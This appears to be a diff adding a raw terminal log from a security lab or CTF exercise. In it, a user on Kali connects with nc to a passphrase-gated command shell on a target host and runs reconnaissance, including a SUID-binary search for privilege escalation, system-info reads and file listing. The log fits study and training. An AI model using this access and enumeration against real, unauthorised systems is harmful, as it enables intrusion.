+hacker   pts/0    :0.0             Thu17    2:21m  0.89s 21.24s /usr/bin/xfce4-terminal
+hacker   pts/1    :0.0             Sun11    2days  2.86s  0.13s w
+
+arp -e
+
+idI fell asleep ... goodbye!
+root@kali:~/Desktop# id
+uid=0(root) gid=0(root) groups=0(root)
+root@kali:~/Desktop# 
+root@kali:~/Desktop# nc 10.241.13.16 10103
+HELLO
+Howdy ...
+PLEASE
+A bit petulant, no?
+ACT
+Your wish ... is my command.
+find / -perm -u=s -type f 2>/dev/null
+cat /etc/proc/meminfo
+/bin/mount
+/bin/ping
+/bin/fusermount
+/bin/umount
+/bin/ntfs-3g
+/bin/su
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/X
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/sbin/mount.davfs
+/usr/sbin/exim4
+/usr/sbin/hddtemp
+/usr/sbin/pppd
+
+
+I fell asleep ... goodbye!
+root@kali:~/Desktop# nc 10.241.13.16 10103
+HELLO
+Howdy ...
+PLEASE
+A bit petulant, no?
+ACT
+Your wish ... is my command.
+cat /proc/meminfo
+MemTotal:        1024468 kB
+MemFree:          168156 kB
+MemAvailable:     620744 kB
+Buffers:          117108 kB
+Cached:           339348 kB
+SwapCached:            0 kB
+Active:           463412 kB
+Inactive:         174888 kB
+Active(anon):     182428 kB
+Inactive(anon):    10268 kB
+Active(file):     280984 kB
+Inactive(file):   164620 kB
+Unevictable:          32 kB
+Mlocked:              32 kB
+SwapTotal:        745992 kB
+SwapFree:         745992 kB
+Dirty:              4244 kB
+Writeback:          1504 kB
+AnonPages:        181908 kB
+Mapped:            83348 kB
+Shmem:             10856 kB
+Slab:             189612 kB
+SReclaimable:     175920 kB
+SUnreclaim:        13692 kB
+KernelStack:        2976 kB
+PageTables:        14368 kB
+NFS_Unstable:          0 kB
+Bounce:                0 kB
+WritebackTmp:          0 kB
+CommitLimit:     1258224 kB
+Committed_AS:     978456 kB
+VmallocTotal:   34359738367 kB
+VmallocUsed:        2380 kB
+VmallocChunk:   34359735803 kB
+HardwareCorrupted:     0 kB
+AnonHugePages:         0 kB
+HugePages_Total:       0
+HugePages_Free:        0
+HugePages_Rsvd:        0
+HugePages_Surp:        0
+Hugepagesize:       2048 kB
+DirectMap4k:       55288 kB
+DirectMap2M:      993280 kB
+
+cat /proc/cpuinfo
+processor    : 0
+vendor_id    : AuthenticAMD
+cpu family    : 6
+model        : 13
+model name    : QEMU Virtual CPU version 1.5.3
+stepping    : 3
+cpu MHz        : 3392.428
+cache size    : 512 KB
+physical id    : 0
+siblings    : 1
+core id        : 0
+cpu cores    : 1
+apicid        : 0
+initial apicid    : 0
+fpu        : yes
+fpu_exception    : yes
+cpuid level    : 4
+wp        : yes
+flags        : fpu pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm nopl pni cx16 hypervisor lahf_lm svm abm sse4a vmmcall
+bogomips    : 6784.85
+TLB size    : 1024 4K pages
+clflush size    : 64
+cache_alignment    : 64
+address sizes    : 40 bits physical, 48 bits virtual
+power management:
+
+
+w
+ 17:38:40 up 5 days,  6:19,  3 users,  load average: 0.92, 0.30, 0.14
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+hacker   :0       :0               Sun11   ?xdm?  30:24   0.25s /bin/sh /etc/xdg/xfce4/xinitrc -- /etc/X11/xinit/xserverrc
+hacker   pts/0    :0.0             Thu17    2:24m  0.89s 21.40s /usr/bin/xfce4-terminal
+hacker   pts/1    :0.0             Sun11    2days  2.83s  0.10s w
+
+groups hacker
+hacker : hacker cdrom floppy sudo audio dip video plugdev netdev scanner bluetooth
+
+echo $SHELLI fell asleep ... goodbye!
+root@kali:~/Desktop# echo $SHELL
+/bin/bash
+root@kali:~/Desktop# nc 10.241.13.16 10103
+HELLO
+Howdy ...
+PLEASE
+A bit petulant, no?
+ACT
+Your wish ... is my command.
+echo $SHELL
+/bin/bash
+
+locate INTERESTING.txt
+
+find INTERESTING.txt
+INTERESTING.txt
+
+cat INTERESTING.txt
+I am interesting!
+
+pwd
+/home/hacker
+
+ls
+cgi-lib.pl
+Desktop
+Documents
+Downloads
+INTERESTING.txt
+lol.txt
+Music
+Pictures
+Public
+secret.html
+Server.pl
+Templates
+Videos
+
+I fell asleep ... goodbye!
+root@kali:~/Desktop#
